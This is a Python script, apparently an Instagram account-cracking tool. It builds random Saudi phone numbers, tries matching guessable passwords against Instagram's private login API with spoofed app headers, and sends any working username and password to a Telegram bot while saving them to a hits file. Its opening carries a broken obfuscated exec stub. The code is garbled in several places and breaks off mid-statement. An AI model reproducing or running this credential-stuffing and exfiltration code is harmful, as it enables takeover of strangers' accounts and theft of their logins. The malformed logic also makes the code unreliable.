#!/usr/bin/python3 -B
import base64 as b
data = lambda x: x(b
exec (compile(data(b.b16decode),'<string>','exec')) import webbrowser
import os
import pyfiglet
# = = = = = = = = = = = = 

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;92m'
l = pyfiglet.figlet_format('N O T   F X')
banner = X+l+Z
print(banner)

def close():
    input('- Press Enter To Exit /')
    sys.exit()
h , b,s,block = 0,0,0,0
tele = 'y' or 'Y'
if "Y" in tele:
    id = input(F+"[+] Id Tele : ")
    print('')
    bot = input(F+"[+] Token Bot : ")
elif "y" in tele:
    id = input(F+"[+] Id Tele : ")
    print('')
    bot = input(F+"[+] Token Bot  : ")
    print()
    print('= = = = = = = = = = = ')
    kl = '1'
print()
print('===============================')
print('')
ask = 'y' or 'Y'
print('')
#-------------------------------------------------------
if kl == "1":               
    make = '0123456789'
    print('')
    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User :  \n [=] Pass :  ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+96650' + us
        pasw = '050' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝗛𝗜 𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 \n======================\n[=] 𝐔𝐒𝐄𝐑 » {user} \n[=] 𝐏𝐀𝐒𝐒 » {pasw} \n======================\n𝑩𝒀 : @T_X_6 ")
            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
            h += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
        elif 'challenge_required' or 
